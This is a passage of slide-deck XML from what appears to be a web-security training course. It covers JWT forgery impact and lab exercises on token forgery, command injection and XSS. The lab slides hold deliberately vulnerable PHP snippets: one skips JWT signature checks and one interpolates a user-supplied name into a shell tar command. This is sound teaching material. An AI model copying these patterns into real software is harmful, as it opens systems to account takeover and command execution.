              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="703" name="Google Shape;703;p42"/>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42"/>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705" name="Google Shape;705;p42"/>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0" name="Shape 710"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="711" name="Google Shape;711;p43"/>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1200"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1200" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="F85149"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>REAL-WORLD IMPACT</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="712" name="Google Shape;712;p43"/>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attackers actually do with JWT flaws</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="713" name="Google Shape;713;p43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="21031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14" name="Google Shape;714;p43"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="796991" y="2260031"/>
            <a:ext cx="289682" cy="289682"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="715" name="Google Shape;715;p43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="20574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Forge any identity</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="716" name="Google Shape;716;p43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="242316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Rewrite the token's claims to become admin - or any other user.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="717" name="Google Shape;717;p43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="33375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18" name="Google Shape;718;p43"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="796991" y="3494471"/>
            <a:ext cx="289682" cy="289682"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="719" name="Google Shape;719;p43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="32918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Full account takeover</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="720" name="Google Shape;720;p43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="365760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Read and act as anyone, with no password and no MFA prompt.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="721" name="Google Shape;721;p43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4572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22" name="Google Shape;722;p43"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="796991" y="4728911"/>
            <a:ext cx="289682" cy="289682"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="723" name="Google Shape;723;p43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="452628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Persist silently</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="724" name="Google Shape;724;p43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="489204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 well-formed token raises no alarms - access looks legitimate.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="725" name="Google Shape;725;p43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6766560" y="2011680"/>
            <a:ext cx="4800600" cy="3931920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 186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43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="22860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100"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1100" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="D29922"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>WAR STORY</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1100" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="727" name="Google Shape;727;p43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="2615184"/>
            <a:ext cx="41605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1800"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1800" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>"alg:none" in the wild, 2015</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="728" name="Google Shape;728;p43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="3200400"/>
            <a:ext cx="41605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4800"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="4800" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="F85149"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Dozens</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="4800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="729" name="Google Shape;729;p43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="4023360"/>
            <a:ext cx="4160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of JWT libraries vulnerable</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1100" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="730" name="Google Shape;730;p43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="4434840"/>
            <a:ext cx="4160520" cy="132588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Security research found many popular JWT libraries accepted alg:none or confused HMAC/RSA keys - enabling trivial token forgery and admin takeover across countless production apps.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="731" name="Google Shape;731;p4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2" name="Google Shape;732;p4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733" name="Google Shape;733;p4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38" name="Shape 738"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="739" name="Google Shape;739;p4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LAB</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="740" name="Google Shape;740;p44"/>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 05</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="741" name="Google Shape;741;p44"/>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Forge your identity</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="2700" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="742" name="Google Shape;742;p44"/>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3" name="Google Shape;743;p44"/>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744" name="Google Shape;744;p44"/>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 · /lab05</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="745" name="Google Shape;745;p44"/>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6" name="Google Shape;746;p44"/>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747" name="Google Shape;747;p44"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="4142232"/>
            <a:ext cx="4480560" cy="8686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Edit a token's claims to become admin.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1350" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="748" name="Google Shape;748;p44"/>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the full app's Bearer API</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="950" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="749" name="Google Shape;749;p44"/>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44"/>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p44"/>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44"/>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44"/>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754" name="Google Shape;754;p44"/>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755" name="Google Shape;755;p44"/>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lab 05: token check</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[$h,$p,$sig] = explode('.',$t);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$claims = json_decode(b64($p));</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if ($claims['is_admin']) grant();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signature never verified</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="756" name="Google Shape;756;p4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7" name="Google Shape;757;p4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758" name="Google Shape;758;p4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3" name="Shape 763"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="764" name="Google Shape;764;p46"/>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06</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="30000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="765" name="Google Shape;765;p46"/>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66" name="Google Shape;766;p46"/>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767" name="Google Shape;767;p46"/>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SCALE UP</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="768" name="Google Shape;768;p46"/>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Harder Labs</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="4600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="769" name="Google Shape;769;p46"/>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Now with more complications!</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1500" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="770" name="Google Shape;770;p46"/>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1" name="Google Shape;771;p46"/>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772" name="Google Shape;772;p46"/>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45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7" name="Shape 777"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="778" name="Google Shape;778;p51"/>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LAB</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="779" name="Google Shape;779;p51"/>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 07</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="780" name="Google Shape;780;p51"/>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Break out and execute</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="2700" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="781" name="Google Shape;781;p51"/>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2" name="Google Shape;782;p51"/>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783" name="Google Shape;783;p51"/>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 · /lab07</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="784" name="Google Shape;784;p51"/>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51"/>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786" name="Google Shape;786;p51"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="4142232"/>
            <a:ext cx="4480560" cy="8686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Break out of the quoting and run your own command. Similar to the command injection earlier, just a bit harder.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1350" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="787" name="Google Shape;787;p51"/>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the full app's restore API</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="950" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="788" name="Google Shape;788;p51"/>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9" name="Google Shape;789;p51"/>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0" name="Google Shape;790;p51"/>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1" name="Google Shape;791;p51"/>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2" name="Google Shape;792;p51"/>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793" name="Google Shape;793;p51"/>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794" name="Google Shape;794;p51"/>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lab 07: archive builder</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$cmd = "tar czf out.tgz</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'$name'";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strips $ and backtick</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="795" name="Google Shape;795;p51"/>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p51"/>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797" name="Google Shape;797;p51"/>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50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02" name="Shape 802"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="803" name="Google Shape;803;p59"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7253935" y="365760"/>
            <a:ext cx="4572000" cy="61264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61B22"/>
              </a:buClr>
              <a:buSzPts val="30000"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="30000" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="161B22"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>08</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="30000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="804" name="Google Shape;804;p59"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2286000"/>
            <a:ext cx="822960" cy="82296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05" name="Google Shape;805;p59"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="854050" y="2499970"/>
            <a:ext cx="395021" cy="395021"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="806" name="Google Shape;806;p59"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="324612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300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1300" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>CLIENT-SIDE · XSS · OPTIONAL - IF TIME</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="807" name="Google Shape;807;p59"/>
          <p:cNvSpPr/>
